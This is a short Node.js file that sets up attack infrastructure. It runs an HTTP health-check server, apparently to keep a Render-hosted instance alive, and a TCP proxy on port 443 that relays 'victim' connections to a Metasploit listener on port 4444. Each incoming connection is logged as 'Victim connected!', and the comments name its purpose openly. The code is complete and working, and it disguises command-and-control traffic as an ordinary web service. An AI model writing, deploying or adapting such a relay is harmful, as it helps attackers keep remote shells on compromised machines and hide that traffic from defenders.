const net = require('net');
const http = require('http');

const PORT = process.env.PORT || 10000;

// HTTP Server for Render Health Check
const httpServer = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Server is running properly\n');
});

// TCP Proxy for Metasploit
const tcpServer = net.createServer((socket) => {
    console.log('Victim connected!');
    const client = net.createConnection({ port: 4444, host: 'localhost' });
    socket.pipe(client);
    client.pipe(socket);
    socket.on('error', (e) => console.log('S-Err:', e.message));
    client.on('error', (e) => console.log('C-Err:', e.message));
});

httpServer.listen(PORT, '0.0.0.0', () => {
    console.log(`HTTP Health Check live on port ${PORT}`);
});

tcpServer.listen(443, '0.0.0.0', () => {
    console.log('TCP Proxy live on 443');
});
